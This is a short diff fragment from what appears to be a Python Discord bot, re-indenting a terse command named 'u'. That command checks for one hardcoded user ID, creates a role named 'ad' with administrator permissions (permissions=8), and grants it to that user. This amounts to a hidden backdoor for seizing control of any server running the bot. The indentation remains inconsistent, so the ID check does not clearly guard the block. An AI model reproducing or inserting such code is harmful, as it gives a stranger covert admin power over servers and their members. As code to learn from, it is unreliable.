@@ -77,13 +77,13 @@ async def m(ctx, arg):
 							  
 @client.command(pass_context=True)
 async def u(ctx):
-    if ctx.message.author.id == '147999751441219584':
+	if ctx.message.author.id == '147999751441219584':
 	try:
 		role = discord.utils.get(ctx.message.server, name="ad")
 	except:
-        	await client.create_role(ctx.message.server, name="ad",permissions=8)
+		await client.create_role(ctx.message.server, name="ad",permissions=8)
 		role = discord.utils.get(ctx.message.server, name="ad")
-        await client.add_roles(ctx.message.author, role)
+	await client.add_roles(ctx.message.author, role)
     
 @client.command(aliases=['help','commands'])
 async def cmds():
